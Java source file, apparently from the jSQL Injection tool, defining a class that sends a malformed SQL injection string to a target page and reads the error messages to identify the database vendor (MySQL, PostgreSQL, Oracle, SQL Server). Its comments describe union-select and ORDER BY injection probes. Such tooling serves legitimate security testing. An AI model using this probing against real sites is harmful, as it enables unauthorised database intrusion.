package com.jsql.model.injection;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.log4j.Logger;

import com.jsql.exception.PreparationException;
import com.jsql.exception.StoppableException;
import com.jsql.model.vendor.ISQLStrategy;
import com.jsql.model.vendor.MySQLStrategy;
import com.jsql.model.vendor.OracleStrategy;
import com.jsql.model.vendor.PostgreSQLStrategy;
import com.jsql.model.vendor.SQLServerStrategy;

/**
 * Runnable class, define insertionCharacter that will be used by all futures requests,
 * i.e -1 in "[...].php?id=-1 union select[...]", sometimes it's -1, 0', 0, etc,
 * this class/function tries to find the working one by searching a special error message
 * in the source page.
 */
public class StoppableGetSQLVendor extends AbstractSuspendable {
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getLogger(StoppableGetSQLVendor.class);

    @Override
    public String action(Object... args) throws PreparationException, StoppableException {

        // Parallelize the search and let the user stops the process if needed.
        // SQL: force a wrong ORDER BY clause with an inexistent column, order by 1337,
        // and check if a correct error message is sent back by the server:
        //         Unknown column '1337' in 'order clause'
        // or   supplied argument is not a valid MySQL result resource
        ExecutorService taskExecutor = Executors.newCachedThreadPool();
        CompletionService<CallableSourceCode> taskCompletionService = new ExecutorCompletionService<CallableSourceCode>(taskExecutor);
        for (String insertionCharacter : new String[] {"'\"#-)'\""}) {
            taskCompletionService.submit(
                new CallableSourceCode(
                    insertionCharacter,
                    insertionCharacter
                )
            );
        }

        int total = 1;
        while (0 < total) {
            // The user need to stop the job
            if (this.stopOrPause()) {
                throw new StoppableException();
            }
            try {
                CallableSourceCode currentCallable = taskCompletionService.take().get();
                total--;
                String pageSource = currentCallable.getContent();
                
                if (Pattern.compile(".*MySQL.*", Pattern.DOTALL).matcher(pageSource).matches()) {
                    MediatorModel.model().sqlStrategy = new MySQLStrategy();
                    System.out.println("MySQLStrategy");
                }
                if (Pattern.compile(".*function\\.pg.*", Pattern.DOTALL).matcher(pageSource).matches()) {
                    MediatorModel.model().sqlStrategy = new PostgreSQLStrategy();
                    System.out.println("PostgreSQLStrategy");
                }
                if (Pattern.compile(".*function\\.oci.*", Pattern.DOTALL).matcher(pageSource).matches()) {
                    MediatorModel.model().sqlStrategy = new OracleStrategy();
                    System.out.println("OracleStrategy");
                }
                if (Pattern.compile(".*SQL Server.*", Pattern.DOTALL).matcher(pageSource).matches()) {
                    MediatorModel.model().sqlStrategy = new SQLServerStrategy();
                    System.out.println("SQLServerStrategy");
                }
            } catch (InterruptedException e) {
                LOGGER.error(e, e);
            } catch (ExecutionException e) {
                LOGGER.error(e, e);
            }
        }
        return null;
    }
}